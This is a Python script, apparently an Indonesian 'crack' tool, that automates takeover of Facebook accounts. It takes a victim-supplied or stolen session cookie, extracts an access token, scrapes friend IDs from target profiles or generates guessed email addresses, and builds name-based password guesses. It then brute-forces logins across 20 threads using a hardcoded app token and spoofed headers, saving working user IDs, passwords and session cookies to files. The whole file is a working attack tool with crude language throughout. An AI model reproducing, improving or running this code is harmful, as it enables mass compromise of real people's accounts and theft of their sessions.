#!/usr/bin/python3
#coding=utf-8
#open source code - date : 20 Jan 2023
#record? boleh, asal mokad update sendiri 


try:
	import os, sys, bs4, random, re
	import requests, json, time, datetime
	from bs4 import BeautifulSoup
	from datetime import datetime
	from concurrent.futures import ThreadPoolExecutor as tred
except Exception as e:
	exit(e)
	
#--------------> CONVERT TANGGAL <--------------#
ct = datetime.now()
n = ct.month
bulan = [
			"Januari","Februari","Maret",
			"April","Mei","Juni",
			"Juli","Agustus","September",
			"Oktober","November","Desember"
		]
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
thn = current.year
bln = current.month
har = current.day
opp = bulan[nTemp]
P,M,H,K,B,U,O,M2,H2,K2,P2,B2,U2,O2,M3,H3,K3,P3,B3,U3,O3 = ['\x1b[0;97m','\x1b[0;91m','\x1b[0;32m','\x1b[0;33m','\x1b[0;44m','\x1b[0;35m','\x1b[0;36m',"[#FF0000]","[#00FF00]","[#FFFF00]","[#FFFFFF]","[#00C8FF]","[#AF00FF]","[#00FFFF]","#FF0000","#00FF00","#FFFF00","#FFFFFF","#00C8FF","#AF00FF","#00FFFF"] # dont change this default color
ok, cp, loop = 0,0,0
#--------------> SYNTAX <--------------#
def jalan(mlaku):
	for aja in mlaku + "\n":
		sys.stdout.write(aja)
		sys.stdout.flush()
		time.sleep(0.03)
#--------------> LOGIN <--------------#
class Peler:
	
	def __init__(self):
		self.id, self.uid, self.log = [],[],[]
		self.pas, self.pwz, self.hasil = [],[],[]
		self.xyz = requests.Session()
#--------------> LOGO - LO GOBLOK <--------------#
	def poster(self):
		os.system("clear")
		print(f"""
   _________ ______ ______
  /  ______//  ___//  ___/
 /  /____  /  /   /  /_
 \_____  \/  / __/  __/ ®
  /  /_\  \ /__\ \ /
  \  _____/ ______\/
   \/ {H}Code{P}\/{H}By Aang-XD{P}
		""")
#--------------> LOGIN WITH COOKIES <--------------#
	def login(self):
		try:
			self.poster()
			cookie = input("%s>> Cookie : "%(P))
			cookies = {"cookie":cookie}
			req = self.xyz.get("https://www.facebook.com/adsmanager/manage/campaigns",cookies=cookies)
			research = re.search("act=(.*?)&nav_source",str(req.content)).group(1)
			link = "%s?act=%s&nav_source=no_referrer"%("https://www.facebook.com/adsmanager/manage/campaigns", research)
			date = self.xyz.get(link, cookies=cookies)
			tokn = re.search('accessToken="(.*?)"',str(date.content)).group(1)
			token = open("token.txt", "w").write(tokn)
			cokie = open("kukis.txt", "w").write(cookie)
			jalan("%s>> Tunggu sebentar ..."%(P));self.menu()
		except Exception as e:
			os.system("rm -rf kukis.txt && rm -rf token.txt")
			jalan(f"%s>> Cookie invalid ..."%(P))
			exit(e)
#--------------> MENU PILIHAN <--------------#
	def menu(self):
		try:
			token = open("token.txt","r").read()
			cokis = open("kukis.txt","r").read()
		except requests.exceptions.ConnectionError:
			jalan(f"%s\n>> Koneksi bermasalah ..."%(P));exit()
		except (KeyError, IOError):
			os.system("clear")
			jalan(f"%s\n>> Cookie invalid ..."%(P));time.sleep(1)
			self.login()
		try:
			ling = self.xyz.get(f"https://graph.facebook.com/me?fields=name&access_token={token}", cookies = {'cookie':cokis})
			nama = json.loads(ling.text)["name"]
		except (KeyError, IOError):
			os.system("clear")
			jalan(f"%s\n>> Cookie invalid ..."%(P));time.sleep(1)
			self.login()
		self.poster()
		print("%s[ Selamat datang %s%s%s ]\n"%(P,H,nama,P))
		print("%s1. Dump id teman publik"%(P))
		print("%s2. Dump id publik massal"%(P))
		print("%s3. Dump search email"%(P))
		print("%s0. Log-out "%(P))
		jawab = input("\n%s>> Pilih : "%(P))
		if jawab == "1" or jawab == "01":self.publik()
		elif jawab == "2" or jawab == "02":self.massal()
		elif jawab == "3" or jawab == "03":self.email()
		elif jawab == "0" or jawab == "00":
			os.system("rm -rf kukis.txt && rm -rf token.txt")
			jalan("%s\n>> Ingfo login terhapus"%(P));exit()
#--------------> DUMP PUBLIK TUNGGAL <--------------#
	def publik(self):
		try:
			token = open("token.txt","r").read()
			cokis = open("kukis.txt","r").read()
		except IOError:exit()
		pb = input("%s\n>> Enter id : "%(P));self.uid.append(pb)
		for target in self.uid:
			try:
				date = self.xyz.get(f"https://graph.facebook.com/v14.0/{target}?fields=name,friends.limit(5000)&access_token={token}",cookies = {'cookies':cokis}).json()
				search = date["name"]
				for x in date["friends"]["data"]:
					try:self.id.append(x["username"]+"|"+x["name"])
					except:self.id.append(x["id"]+"|"+x["name"])
			except (KeyError,IOError):
				jalan("%s\n>> Target tidak publik ..."%(P));time.sleep(1);exit()
		try:
			print("\n%s>> Target name  : %s%s"%(P,H,search))
			print("%s>> Id terkumpul : %s%s"%(P,H,str(len(self.id))))
			self.default()
		except requests.exceptions.ConnectionError:
			jalan(f"%s\n>> Koneksi bermasalah ..."%(P));time.sleep(1);exit()
#--------------> DUMP PUBLIK MASSAL <--------------#
	def massal(self):
		try:
			token = open("token.txt","r").read()
			cokis = open("kukis.txt","r").read()
		except IOError:exit()
		try:nambah = int(input("\n%s>> Enter jumlah id, max 50 : "%(P)))
		except ValueError:exit()
		if nambah<1 or nambah>50:
			jalan("%s>> Maximal %s50 id%s saja"%(P,H,P));time.sleep(1);self.menu()
		ftv=0
		for z in range(nambah):
			ftv+=1
			mas = input("%s>> Enter id : "%(P))
			self.uid.append(mas)
		for target in self.uid:
			try:
				date = self.xyz.get(f"https://graph.facebook.com/v14.0/{target}?fields=name,friends.limit(5000)&access_token={token}",cookies = {'cookies':cokis}).json()
				search = date["name"]
				for sig in date["friends"]["data"]:
					try:
						jumlah = (sig["id"]+"|"+sig["name"])
						if jumlah in self.id:pass
						else:
							self.id.append(jumlah)
					except:continue
			except (KeyError,IOError):
				jalan("%s\n>> Target tidak publik ..."%(P));time.sleep(1);exit()
		try:
			print("\n%s>> Target name  : %s%s"%(P,H,search))
			print("%s>> Id terkumpul : %s%s"%(P,H,str(len(self.id))))
			self.default()
		except requests.exceptions.ConnectionError:
			jalan(f"%s\n>> Koneksi bermasalah ..."%(P));time.sleep(1);exit()
#--------------> DUMP SEARCH EMAIL <--------------#
	def email(self):
		global ok, cp
		one = ["sekar","ayu","prasetyo","cantik","cntk","pratama","wibu","tzy","pubg","oleng","ahmad","hudayat","ramadhan","saputra","gabut","andi","dwi","muhammad","mohammad","dewi","nur","tri","dian","sri","putri","eka","sari","aditya","budi","cahya","riski","risky","gunawan","darmawan","hadi"]
		two = ["sarah","ramadhan","xxx","gans","slank","ska","yyy","santuy","cans","pribadi","ganz","999","official","gaming","utama","123","321","coc","ml","ff","12345","cakep","bkp","234","firmansyah","wahyudi","satrio","purnama","joko","ahlan"]
		nama = input("\n%s>> Enter nama : "%(P))
		if "," in str(nama):
			jalan("\n%s>> Masukin nama 1 saja kontol"%(P))
			time.sleep(1);self.menu()
		print("\n%s>> Cth : @gmail.com/@yahoo.com"%(P))
		domain = input("%s>> Enter domain : "%(P))
		if "@" not in str(domain) or ".com" not in str(domain):
			jalan("\n%s>> Masukan domain dengan benar"%(P))
			time.sleep(1);self.menu()
		jumlah = input("%s>> Total email :  "%(P))
		for qp in range(int(jumlah)):
			XX = nama
			YY = [
					f"{str(random.choice(one))}",
					f"{str(random.randint(0,41))}",
					f"{str(random.choice(two))}",
					f"{str(random.choice(one))}{str(random.randint(0,41))}",
					f"{str(random.choice(one))}.{str(random.randint(0,41))}",
					f"{qp}",
					f"{str(random.choice(two))}{str(random.randint(0,41))}",
					f"{str(random.choice(one))}{str(random.choice(two))}"
					f"{str(random.choice(two))}.{str(random.randint(0,41))}",
					f"{str(random.choice(one))}.{str(random.choice(two))}"
				]
			ZZ = domain
			QQ = f"{XX}{str(random.choice(YY))}{ZZ}"
			if QQ in self.id:pass
			else:self.id.append(QQ+"|"+nama)
			print(f"\r%s>> Proses dump email : %s  "%(P,len(self.id)), end='');sys.stdout.flush()
		self.default()
#--------------> METHOD & PENGATURAN PASSWORD <--------------#
	def default(self):
		ask = input("\n%s>> Password manual (y/t): "%(P))
		if ask == "y" or ask == "Y" or ask == "ya" or ask == "YA":
			self.pas.append("yamete")
			print("%s>> Gunakan tanda (,) untuk pemisah"%(P))
			print("%s>> Cth : sayakangen,mantan"%(P))
			her = input("%s>> Password : "%(P))
			sandi = her.split(",")
			for e in sandi:
				self.pwz.append(e)
		print("\n%s>> 1. Log mobile [off]"%(P))
		print("%s>> 2. Log graph.api "%(P))
		ask = input("\n%s>> Pilih : "%(P))
		if ask == "1" or ask == "01":self.log.append("mobile")
		elif ask == "2" or ask == "02":self.log.append("graph")
		else:self.log.append("graph")
		self.password()
#--------------> CRACKER <--------------#
	def brute(self, user, asw, url):
		global ok, cp, loop
		for pw in asw:
			try:
				params = (
					{
						"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
						"sdk_version": {random.randint(1,26)}, 
						"email": user,
						"locale": "zh_CN",
						"password": pw,
						"sdk": "android",
						"generate_session_cookies": "1",
						"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
				}
					)
				headers = (
					{
						"Host": url,
						"x-fb-sim-hni": str(random.randint(100000, 300000)),
						"x-fb-net-hni": str(random.randint(100000, 300000)),
						"x-fb-connection-quality": "EXCELLENT",
						"user-agent": Ngocox().kanjut(),
						"content-type": "application/x-www-form-urlencoded",
						"x-fb-device-group": f"{str(random.randint(1000, 4000))}",
						"x-fb-friendly-name": "RelayFBNetwork_GemstoneProfilePreloadableNonSelfViewQuery",
						"x-fb-request-analytics-tags": "unknown",
						"accept-encoding": "gzip, deflate",
						"x-fb-http-engine": "Liger",
						"connection": "close"
				}
					)
				post = self.xyz.post(f"https://{url}/auth/login?locale=zh_CN", params=params, headers=headers, allow_redirects=False)
				if "session_key" in post.text and "EAA" in post.text:
					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"]);user = re.findall("c_user=(\d+)",coki)[0]
					ok+=1
					print("\r%s*--> %s%s|%s|%s"%(P,H,user,pw,coki))
					open("OK/%s-%s-%s.txt"%(har,opp,thn),"a").write(user+"|"+pw+"|"+coki+"\n")
					self.hasil.append(user+"|"+pw+"|"+coki);os.popen("play-audio data/audio/ok.mp3")
					break
				elif "User must verify their account" in post.text:
						print("\r%s*--> %s%s|%s              "%(P,K,user,pw))
						cp+=1
						open("CP/%s-%s-%s.txt"%(har,opp,thn),"a").write(user+"|"+pw+"\n")
						self.hasil.append(user+"|"+pw);os.popen("play-audio data/audio/cp.mp3")
						break
				elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
					sys.stdout.write("\r%s>> %s/%s - [OK:%s%s%s] [CP:%s%s%s] "%(P,loop,len(self.id),H,ok,P,K,cp,P), end=""),sys.stdout.flush()
					time.sleep(10)
				else:continue
			except ConnectionError:
				time.sleep(10)
		loop +=1
		sys.stdout.write("\r%s>> %s/%s - [OK:%s%s%s] [CP:%s%s%s] "%(P,loop,len(self.id),H,ok,P,K,cp,P)),sys.stdout.flush()
#--------------> ATUR KATA SANDI <--------------#
	def password(self):
		print("\n%s>> %sOK%s save : OK/%s-%s-%s.txt"%(P,H,P,har,opp,thn))
		print("%s>> %sCP%s save : CP/%s-%s-%s.txt\n"%(P,K,P,har,opp,thn))
		with tred(max_workers=20) as __rampung__:
			for AangXD in self.id:
				user,__cans__ = AangXD.split("|")[0],AangXD.split("|")[1].lower()
				__kiya__ = __cans__.split(" ")[0]
				asw = []
				if len(__cans__)<6:
					if len(__kiya__)<3:pass
					else:
						asw.append(__kiya__+'123');asw.append(__kiya__+'1234');asw.append(__kiya__+'12345')
				else:
					if len(__kiya__)<3:asw.append(__cans__)
					else:asw.append(__cans__);asw.append(__kiya__+'123');asw.append(__kiya__+'1234');asw.append(__kiya__+'12345')
				if "yamete" in self.pas:
					for u in self.pwz:
						asw.append(u)
				else:pass
				if "mobile" in self.log:__rampung__.submit(self.brute, user, asw, "m.facebook.com")
				elif "graph" in self.log:__rampung__.submit(self.brute, user, asw, "graph.facebook.com")
				else:__rampung__.submit(self.brute, user, asw, "graph.facebook.com")
		print("\n\n%s[ %sProgram Finished%s ]"%(P,H,P))
		time.sleep(1);exit()
#--------------> CONVERT USER AGENT <--------------#
class Ngocox:
	
	def kanjut(self):
		az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
		smart = str(random.randint(8, 12))
		chrome3 = str(random.randint(100, 300))
		chrome4 = str(random.randint(1000, 9000))
		builx = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
		chrome6 = str(random.randint(100000, 900000))
		ngentod = f"Mozilla/5.0 (Linux; Android {smart}; RMX2144) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.{chrome4}.{chrome3} Mobile Safari/537.36"
		return ngentod

if __name__=="__main__":
	Peler().menu()